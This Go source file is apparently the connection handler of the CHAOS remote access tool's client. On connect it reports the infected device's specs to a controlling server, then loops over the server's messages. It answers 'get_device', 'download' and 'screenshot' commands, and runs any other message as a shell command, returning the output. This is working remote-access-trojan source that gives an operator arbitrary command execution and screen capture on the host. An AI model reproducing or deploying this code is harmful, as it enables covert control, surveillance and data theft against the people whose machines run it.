package connection

import (
	"fmt"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/client/app/handler"
	"github.com/tiagorlampert/CHAOS/client/app/usecase"
	"github.com/tiagorlampert/CHAOS/client/app/util"
	"github.com/tiagorlampert/CHAOS/client/app/util/network"
	"io"
	"net"
	"strings"
)

type ConnectionHandler struct {
	Connection net.Conn
	UseCase    *usecase.UseCase
}

func NewConnectionHandler(conn net.Conn, useCase *usecase.UseCase) handler.Handler {
	return &ConnectionHandler{
		Connection: conn,
		UseCase:    useCase,
	}
}

func (c ConnectionHandler) Handle() error {
	sendDeviceSpecs(c.Connection)

	for {
		message, err := network.Read(c.Connection)
		if err != nil {
			switch err {
			case io.EOF:
				log.Warnln("client closed the connection by terminating the process")
			default:
				log.WithField("cause", err.Error()).Error("error reading from connection")
			}
			break
		}

		switch strings.TrimSpace(string(message)) {
		case "get_device":
			device, _ := util.PrettyEncode(util.LoadDeviceSpecs())
			_ = network.Send(c.Connection, device)
		case "download":
			c.UseCase.Download.File()
		case "screenshot":
			c.UseCase.Screenshot.TakeScreenshot()
		default:
			fmt.Println("Message from server: " + string(message))
			response := util.RunCmd(string(message), 10)
			_ = network.Send(c.Connection, response)
		}
	}
	return nil
}

func sendDeviceSpecs(conn net.Conn) {
	device, err := util.Encode(util.LoadDeviceSpecs())
	if err != nil {
		log.WithField("cause", err.Error()).Fatal("error encoding device specs")
	}
	if err := network.Send(conn, device); err != nil {
		log.WithField("cause", err.Error()).Fatal("error writing device specs")
	}
}
